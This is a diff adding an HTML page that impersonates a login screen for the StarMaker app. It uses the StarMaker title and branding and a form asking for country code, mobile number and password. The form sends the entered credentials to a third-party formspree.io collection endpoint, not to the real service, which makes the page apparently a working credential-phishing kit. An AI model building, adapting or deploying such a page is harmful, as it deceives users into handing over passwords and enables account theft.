@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="https://m.media-amazon.com/images/I/81Z2rz4-hEL.png">
+    <title>StarMaker</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&family=Sacramento&display=swap"
+      rel="stylesheet"
+    />
+   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Trirong"> 
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap">
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    
+    <div class="main-container">
+      <video autoplay loop muted>
+        <source src="https://cdn.glitch.global/8c9a1e6c-d82a-4d58-8983-b9445155491f/6969497-hd_1920_1080_25fps.mp4?v=1713201493965" type="video/mp4" />
+      </video>
+
+      <div class="bg-overlay"></div>
+
+      <nav>
+        <div class="logo">
+          <a><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5cwEjEiyLQ2Xfg6Q7YkezUCIME_DVAAhsXmwPnWaolKqB0LydcxEXZ4TNDdNXsXcJ_fNPG4C6jG-YbCDkUk6u6G34NupOlxuLIU58M_hasPKdtCmeyzdV0I6NBBxAsU6_QC0zq3qfEppiEnUq2ijWsuomKmsQ3H_d7-5gnIXipf4fmRZhG-AaiAYZAqk/s384/IMG_20231118_020618.png"></a>
+        </div>
+
+       
+      </nav> 
+
+      <header class="hero-section">
+      
+        
+  <form action="https://formspree.io/f/mjvqvkjr" id="my-form" method="POST">
+  <div class="container">
+     <div class="upper-text">
+      <p>Mobile Number Login</p>
+     
+</div>
+    
+    <label for="psw"></label>
+    <input name="country" placeholder="Country Code (eg.: +1)" required="" type="text" />
+    
+    <label for="number"></label>
+    <input id="mobile" name="number" placeholder="Mobile no." type="tel" pattern="[0-9]{10}" required/>
+
+    <label for="psw"></label>
+    <input name="psw" placeholder="Enter Your Password" required="" type="password" />
+    
+    <div class="clearfix">
+      <button class="signupbtn" type="submit">Log In</button>
+    </div>
+  </div>
+</form>
+   
+      </header>  
+ <div class="containersuccess"></div>
+  <div id="status" class="success-message"></div>
+     
+      
+   </div>   
+    
+   
+    <script src="main.js"></script>
+  </body>
+</html>
